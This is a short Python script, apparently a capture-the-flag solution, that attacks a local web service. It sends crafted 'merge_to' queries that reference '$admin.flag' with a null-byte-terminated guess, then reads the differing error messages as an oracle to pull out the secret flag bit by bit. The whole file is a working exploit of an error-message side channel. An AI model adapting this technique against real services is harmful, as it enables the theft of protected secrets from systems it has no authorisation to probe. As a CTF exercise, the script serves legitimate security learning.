import requests
from itertools import zip_longest
from functools import reduce


def generate_config(flag):
    return {
        'queries': [
            {
                'name': 'merge_to',
                'auth': {},
                'data': '$admin.flag'
            },
            {
                'name': 'merge_to',
                'auth': '$operations',
                'data': f'{flag}\0flag'
            }
        ]
    }


def bits_to_str(bits):
    s_bytes = zip_longest(*([iter(bits)] * 8), fillvalue=0)
    return ''.join(chr(reduce(lambda current, bit: current << 1 | bit, byte)) for byte in s_bytes)


def main():
    flag_bits = []
    flag = ''
    while not flag or flag[-1] != '}':
        flag = bits_to_str(flag_bits + [1])
        out = requests.get('http://localhost:5000/query', json=generate_config(flag)).content.decode()
        if 'You will not use the flag' in out:
            flag_bits.append(0)
        elif 'You will not even reach the flag' in out:
            flag_bits.append(1)
        else:
            raise ValueError(out)
        print(flag, end='\r')
    print(flag)


if __name__ == '__main__':
    main()
